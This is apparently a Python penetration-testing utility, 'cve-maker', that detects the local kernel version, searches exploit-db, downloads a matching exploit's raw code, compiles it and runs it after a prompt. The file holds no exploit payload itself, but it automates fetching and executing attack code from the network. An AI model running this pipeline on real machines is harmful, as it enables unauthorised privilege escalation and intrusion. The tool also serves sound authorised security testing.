#!/usr/bin/env python3

__description__ = 'Tool to detect, find, compile and execute a CVE on the current machine.'
__author__ = 'msd0pe'
__version__ = '1.3.2'
__date__ = '2019/08/03'

"""
https://github.com/msd0pe-1
Source code put in public domain by msd0pe, no Copyright
Any malicious or illegal activity may be punishable by law
Use at your own risk
"""

"""
CHANGELOG:
	2019/08/03 : V1.3.2 - Upgrading to Python 3.7, optimizing Detect option & detecting payloads langages.
	2019/07/05 : V1.3.1 - Optimization of the Search and Detect options.
	2019/06/28 : V1.3 - Adding the Searching option.
	2019/06/28 : V1.2 - Adding the EDB Check option.
	2019/06/25 : V1.1 - Adding the Detection option.
	2019/06/23 : V1.0 - Project Start.
"""

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

try:
    import os
    import re
    import urllib
    import requests
    import optparse
    import subprocess
    from bs4 import BeautifulSoup

except ImportError:
    print(bcolors.RED + bcolors.BOLD + "\nError. Have you installed the requirements properly?" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.RED + bcolors.BOLD + "Be sure to run the script as follows:\n" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.OCRA + bcolors.BOLD + "python3 cve-maker.py ...." + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.OCRA + bcolors.BOLD + "./cve-maker.py ...." + bcolors.ENDC + bcolors.ENDC)

exploit_db = "https://www.exploit-db.com/"


def Execute(name, langage):
    YES = {'Y', 'y', 'YES', 'yes'}
    NO = {'N', 'n', 'NO', 'no', ''}
    
    choice = input(bcolors.RED + bcolors.BOLD + "> RUN THE EXPLOIT ?" + bcolors.ENDC + bcolors.ENDC + " Y/(N)\n\n")
    if choice in YES:
        print(bcolors.BLUE + bcolors.BOLD + "\nRUNNING...\n" + bcolors.ENDC + bcolors.ENDC)
        try:
            if langage == "sh":
                subprocess.call(["sh", "/tmp/exploit/" + name + ".sh"])
            elif langage == "ruby":
                subprocess.call(["ruby", "/tmp/exploit/" + name + ".rb"])
            elif langage == "perl":
                subprocess.call(["perl", "/tmp/exploit/" + name + ".pl"])
            elif langage == "python":
                subprocess.call(["python", "/tmp/exploit/" + name + ".py"])
            elif langage == "php":
                subprocess.call(["php", "/tmp/exploit/" + name + ".php"])
            else:
                subprocess.call(["/tmp/exploit/" + name])
        except OSError:
            print(bcolors.RED + bcolors.BOLD + "Failed to run the exploit ! Maybe you forgot to specify the right langage.\nBe carefull, sometimes, CVE contains not only the payload. Use 'cat /tmp/exploit/yourexploit.something to verify if it not contains some text.'\n")
    elif choice in NO:
        exit()
    else:
        print(bcolors.RED + bcolors.BOLD + "\nYou must enter a valid letter !" + bcolors.ENDC + bcolors.ENDC)
        Execute(name, langage)


def Compilation(name, options, langage):

    print(bcolors.BLUE + bcolors.BOLD + "COMPILING...\n" + bcolors.ENDC + bcolors.ENDC)

    if langage == "sh":
        pass

    elif langage == "ruby":
        pass

    elif langage == "perl":
        pass

    elif langage == "python":
        pass

    elif langage == "php":
        pass

    elif langage == "c++":
        if options == None:
            command = ["g++", "/tmp/exploit/" + name + ".cpp", "-o", "/tmp/exploit/" + name]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ This exploit probably needs GCC options ! /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()
        else:
            command = ["g++", "/tmp/exploit/" + name + ".cpp", "-o", "/tmp/exploit/" + name, options]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ GCC options seams to be not correct or library missing /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()

    else:
        if options == None:
            command = ["gcc", "/tmp/exploit/" + name + ".c", "-o", "/tmp/exploit/" + name]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ This exploit probably needs GCC options ! /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()
        else:
            command = ["gcc", "/tmp/exploit/" + name + ".c", "-o", "/tmp/exploit/" + name, options]
            try:
                print(bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command))
                msg = subprocess.check_output(command)
                print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n")
            except:
                print(bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC)
                print(bcolors.RED + bcolors.BOLD + "/!\ GCC options seams to not be correct or library missing /!\ \n" + bcolors.ENDC + bcolors.ENDC)
                exit()


def WritePayload(payload, name, langage):
    
    if langage == "sh":
        exploit = open("/tmp/exploit/" + str(name) + ".sh", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".sh\n") 

    elif langage == "ruby":
        exploit = open("/tmp/exploit/" + str(name) + ".rb", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".rb\n") 

    elif langage == "perl":
        exploit = open("/tmp/exploit/" + str(name) + ".pl", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".pl\n")

    elif langage == "python":
        exploit = open("/tmp/exploit/" + str(name) + ".py", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".py\n")

    elif langage == "php":
        exploit = open("/tmp/exploit/" + str(name) + ".php", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".php\n")

    elif langage == "c++":
        exploit = open("/tmp/exploit/" + str(name) + ".cpp", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".cpp\n")

    else:
        exploit = open("/tmp/exploit/" + str(name) + ".c", "wb")
        exploit.write(payload)
        exploit.close()
        print(bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".c\n") 


def FindCVE(site, cve, edb):
    
    global name
    global payload
    
    if site == "exploit_db":
        if edb:
            try:
                print(bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + exploit_db + "raw/" + edb)
                sock = urllib.request.urlopen(exploit_db + "raw/" + edb)
                payload = sock.read()
                sock.close()
                name = edb
                error = re.search('Page Not Found', str(payload))

            except AttributeError:
               print(bcolors.RED + bcolors.BOLD + "\nYou are probably using Python2 ! Use Python3 to run the script.\n" + bcolors.ENDC + bcolors.ENDC)

            except urllib.error.HTTPError:
                print(bcolors.RED + bcolors.BOLD + "\nExploit not found ! Verify your ECB-ID.\n" + bcolors.ENDC + bcolors.ENDC)
                exit()
       
        elif cve:
            print(bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + exploit_db + "search?cve=" + cve) 
            header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
            url = exploit_db + "search?cve=" + cve
            sock_cve = requests.get(url, headers = header)
            findme = BeautifulSoup(sock_cve.text, 'html.parser')
            try:
                cve_edb = re.search('exploit_id\"\:\"(.*?)\"\,\"code_type', str(findme)).group(1)
                print(bcolors.PURPLE + bcolors.BOLD + "> DETERMINATION OF THE EDB ID : " + bcolors.ENDC + bcolors.ENDC + cve_edb)
                sock_edb = urllib.request.urlopen(exploit_db + "raw/" + cve_edb)
                payload = sock_edb.read()
                sock_edb.close()
                name = cve_edb
            except AttributeError:
                print(bcolors.RED + bcolors.BOLD + "\nCVE name seams to not be correct.\n" + bcolors.ENDC + bcolors.ENDC)	   

    return payload, name


def GuessLang(payload):

    global findlang

    c_cpp_wordlist = ["#include"]
    shell_wordlist = ["#!/bin/sh", "#!/bin/bash", "#!/usr/bin/bash", "#/usr/bin/sh", "#!/usr/bin/env sh", "#!/usr/bin/env bash"]
    ruby_wordlist = ["#!/bin/ruby", "#!/usr/bin/ruby", "#!/usr/bin/env ruby"]
    perl_wordlist = ["#!/bin/perl", "#!/usr/bin/perl", "#!/usr/bin/env perl"]
    python_wordlist = ["#!/bin/python", "#!/usr/bin/python", "#!/usr/bin/env python"]
    php_wordlist = ["#!/bin/php", "#/usr/bin/php", "#!/usr/bin/env php", "<?php"]
    metasploit_wordlist = ["MetasploitModule", "Msf::Exploit"]
    all_wordlist = c_cpp_wordlist + shell_wordlist + ruby_wordlist + perl_wordlist + python_wordlist + php_wordlist + metasploit_wordlist

    for word in all_wordlist:
        if word in payload and word in c_cpp_wordlist:
            findlang = " - " + bcolors.CYAN + bcolors.BOLD + "c or c++" + bcolors.ENDC + bcolors.ENDC
            break
        elif word in payload and word in shell_wordlist:
            findlang = " - " + bcolors.GREEN + bcolors.BOLD + "sh" + bcolors.ENDC + bcolors.ENDC
            break
        elif word in payload and word in ruby_wordlist:
            findlang = " - " + bcolors.RED + bcolors.BOLD + "ruby" + bcolors.ENDC + bcolors.ENDC
            break
        elif word in payload and word in perl_wordlist:
            findlang = " - " + bcolors.PURPLE + bcolors.BOLD + "perl" + bcolors.ENDC + bcolors.ENDC
            break
        elif word in payload and word in python_wordlist:
            findlang = " - " + bcolors.OCRA + bcolors.BOLD + "python" + bcolors.ENDC + bcolors.ENDC
            break
        elif word in payload and word in php_wordlist:
            findlang = " - " + bcolors.BLUE + bcolors.BOLD + "php" + bcolors.ENDC + bcolors.ENDC
            break
        elif word in payload and word in metasploit_wordlist:
            findlang = " - " + bcolors.BOLD + bcolors.RED + "metasploit" + bcolors.ENDC + bcolors.ENDC
            break
        else:
            findlang = " - " + bcolors.BOLD + "text" + bcolors.ENDC
        

def CVEFound(equalize_parser, description, detect_cve_name, check):
    n = 0
    equalizer = ""
    del equalize_parser[0]
    header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}

    try:
        if len(description) < 50:
            for i in range(0, len(description)):
                detect_edb = re.search('"(.*?)"', str(description[i])).group(0).strip('""')
                sock_edb = urllib.request.urlopen(exploit_db + "raw/" + detect_edb)
                payload = sock_edb.read()
                sock_edb.close()

                GuessLang(str(payload))
                equalizer = equalize_parser[i].find(detect_cve_name[n])
                if payload != "":
                    if equalizer != -1:
                        print(bcolors.RED + bcolors.BOLD + "CVE-" + bcolors.ENDC + bcolors.ENDC + detect_cve_name[n] + " : " + description[i] + findlang)
                        IsCheck(description, i, check)
                        n += 1
                        if n == len(detect_cve_name):
                            break
                    else:
                        print(bcolors.RED + bcolors.BOLD + "CVE-NONE" + bcolors.ENDC + bcolors.ENDC + " : " + description[i] + findlang)
                        IsCheck(description, i, check)
                else:
                    if equalizer != -1:
                        print(bcolors.RED + bcolors.BOLD + "CVE-" + bcolors.ENDC + bcolors.ENDC + detect_cve_name[n] + " : " + description[i])
                        IsCheck(description, i, check)
                        n += 1
                        if n == len(detect_cve_name):
                            break
                    else:
                        print(bcolors.RED + bcolors.BOLD + "CVE-NONE" + bcolors.ENDC + bcolors.ENDC + " : " + description[i])
                        IsCheck(description, i, check)

        else:
            print(bcolors.RED + bcolors.BOLD + "Too many results, be more specific !" + bcolors.ENDC + bcolors.ENDC)

    except:
        print("")
        print(bcolors.RED + bcolors.BOLD + "Be careful, maybe not all CVEs are displayed." + bcolors.ENDC + bcolors.ENDC) 
        pass

def SearchExploit(software, check): 

    if software == None:
        pass

    else:
        print(bcolors.BLUE + bcolors.BOLD + "\nSEARCHING..." + bcolors.ENDC + bcolors.ENDC)
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
        url = exploit_db + "search?q=" + software
        print(bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + url + "\n")
        sock_find = requests.get(url, headers = header)
        findme = BeautifulSoup(sock_find.text, 'html.parser')
        try:
            detect_cve_name = re.findall('\"cve\"\,\"code\"\:\"(.*?)\"', str(findme), re.DOTALL)
            description = re.findall('description\"\:(.*?)\,\"type_id', str(findme), re.DOTALL)
            equalize_parser = str(findme).split('description')
            if detect_cve_name == [] and description == []:
                print(bcolors.GREEN + bcolors.BOLD + "No CVE found for this software version !" + bcolors.ENDC + bcolors.ENDC)
                print("")
            else:
                print(bcolors.RED + bcolors.BOLD + "> EXPLOITS FOUND : " + bcolors.ENDC + bcolors.ENDC + "\n")
                if description == [] and detect_cve_name != []:
                    for i in range(0, len(detect_cve_name)):
                        print(bcolors.RED + bcolors.BOLD + "CVE-" + bcolors.ENDC + bcolors.ENDC + detect_cve_name[i] + " : " + "No description found.")
                        IsCheck(detect_cve_name, i, check)
                    print("")
                else:
                    CVEFound(equalize_parser, description, detect_cve_name, check)
                    print("")

        except RuntimeError:
            print(bcolors.RED + bcolors.BOLD + "Too many results, be more specific !\n" + bcolors.ENDC + bcolors.ENDC)		

        except:
            print(bcolors.RED + bcolors.BOLD + "Error during the searching !\n" + bcolors.ENDC + bcolors.ENDC)

def CreateDirectory():
    try: 
        os.makedirs("/tmp/exploit")
    except OSError:
        if not os.path.isdir("/tmp/exploit"):
            Raise


def IsCheck(description, i, check):

    if check == None:
        pass

    else:
        detect_edb_id = re.search('\"(.*?)\"\,', str(description[i])).group(1)
        url = exploit_db + "exploits/" + detect_edb_id
        sock_check = urllib.request.urlopen(url)
        ischeck = sock_check.read()
        sock_check.close()
        verified = re.search('mdi-check', str(ischeck))
        if verified == None:
            print(bcolors.OCRA + bcolors.BOLD + "EDB Verified : " + bcolors.ENDC + bcolors.ENDC + bcolors.RED + bcolors.BOLD + "NO" + bcolors.ENDC + bcolors.ENDC)
        else:
            print(bcolors.OCRA + bcolors.BOLD + "EDB Verified : " + bcolors.ENDC + bcolors.ENDC + bcolors.GREEN + bcolors.BOLD + "YES" + bcolors.ENDC + bcolors.ENDC)


def DetectCVE(site, detect, check):
    if site == "exploit_db":
        if detect == None:
            pass

        else:
            print(bcolors.BLUE + bcolors.BOLD + "\nDETECTING...\n" + bcolors.ENDC + bcolors.ENDC)
            os_uname = os.uname()
            os_concat = os_uname[0] + ' ' + os_uname[2]
            os_version_number = re.search('(.*?)-', os_concat).group(1)
            print(bcolors.PURPLE + bcolors.BOLD + "> KERNEL FOUND : " + bcolors.ENDC + bcolors.ENDC + os_version_number + "\n")

            header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
            url = exploit_db + "search?text=" + os_version_number
            print(bcolors.OCRA + bcolors.BOLD + "> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + url + "\n")
            sock_detect = requests.get(url, headers = header)
            findme = BeautifulSoup(sock_detect.text, 'html.parser')
            equalize_parser = str(findme).split('description')
            try:
                detect_cve_name = re.findall('\"cve\"\,\"code\"\:\"(.*?)\"', str(findme), re.DOTALL)
                description = re.findall('description\"\:(.*?)\,\"type_id', str(findme), re.DOTALL)
                if detect_cve_name == [] and description == []:
                    print(bcolors.GREEN + bcolors.BOLD + "This machine does not seams vulnerable !" + bcolors.ENDC + bcolors.ENDC)
                    print("")
                else:
                    print(bcolors.RED + bcolors.BOLD + "> POSSIBLE EXPLOITS : " + bcolors.ENDC + bcolors.ENDC + "\n")
                    if description == [] and detect_cve_name != []:
                        for i in range(0, len(detect_cve_name)):
                            print(bcolors.RED + bcolors.BOLD + "CVE-" + bcolors.ENDC + bcolors.ENDC + detect_cve_name[i] + " : " + "No description found.")
                            IsCheck(detect_cve_name, i, check)
                        print("")
                    else:
                        CVEFound(equalize_parser, description, detect_cve_name, check)
                        print("")

            except RuntimeError:
                print(bcolors.RED + bcolors.BOLD + "Too many results, be more specific !\n" + bcolors.ENDC + bcolors.ENDC)

            except:
                print(bcolors.RED + bcolors.BOLD + "Error during the detection !\n" + bcolors.ENDC + bcolors.ENDC)


def Main():
    Menu = optparse.OptionParser(usage='python %prog [options] site', version='%prog ' + __version__)
    Menu.add_option('-d', '--detect', action="store_true", dest="detect", help='detect vulnerabilities on the current machine')
    Menu.add_option('-i', '--check', action="store_true", dest="check", help='check if the edb-id is verified')
    Menu.add_option('-f', '--find', type="str", dest="find", help='looking for an exploit by its vulnerable software')
    Menu.add_option('-c', '--cve', type="str", dest="cve", help='looks for the CVE from its name')
    Menu.add_option('-e', '--edb', type="str", dest="edb", help='looks for the CVE from its EDB-ID')
    Menu.add_option('-g', '--gcc', type="str", dest="gcc", help='add options to compilation')
    Menu.add_option('-l', '--lang', type="str", dest="lang", help='langage of the exploit. [Default: c]')
    (options, args) = Menu.parse_args()

    Sites = optparse.OptionGroup(Menu, "Available 0day sites", "exploit_db\n")
    Menu.add_option_group(Sites)

    Langages = optparse.OptionGroup(Menu, "Langages", "sh\n ruby\n perl\n python\n php\n c++\n c\n")
    Menu.add_option_group(Langages)

    Examples = optparse.OptionGroup(Menu, "Examples", 'python cve-maker -e 12345 -l ruby exploit_db                          python cve-maker -c 2019-98765 -g "-lpthread" exploit_db')
    Menu.add_option_group(Examples) 

    sites = {"exploit_db"}
     
    if len(args) != 1:
        Menu.print_help()
        print('')
        print('  %s' % __description__)
        print('  Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
        print('  Any malicious or illegal activity may be punishable by law')
        print('  Use at your own risk')

    elif len(args) == 1:
        site = args[0]
        if site in sites:
            try:
                SearchExploit(options.find, options.check)
                DetectCVE(site, options.detect, options.check)
                CreateDirectory()
                FindCVE(site, options.cve, options.edb)
                WritePayload(payload, name, options.lang)
                Compilation(name, options.gcc, options.lang)
                Execute(name, options.lang)

            except NameError:
                if options.cve == None and options.edb == None and options.detect == None and options.check == None and options.find == None:
                    print(bcolors.RED + bcolors.BOLD + "\nYou must specify a CVE-NAME or a EDB-ID !\n" + bcolors.ENDC + bcolors.ENDC)
                elif options.check == True and options.detect == None and options.find == None:
                    print(bcolors.RED + bcolors.BOLD + "\nDon't forget the '-d' or '-f' option !\n" + bcolors.ENDC + bcolors.ENDC)
                else:
                    pass

        else:
            Menu.print_help()
            print('')
            print('  %s' % __description__)
            print('  Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
            print('  Any malicious or illegal activity may be punishable by law')
            print('  Use at your own risk')

if __name__ == '__main__':
    Main()
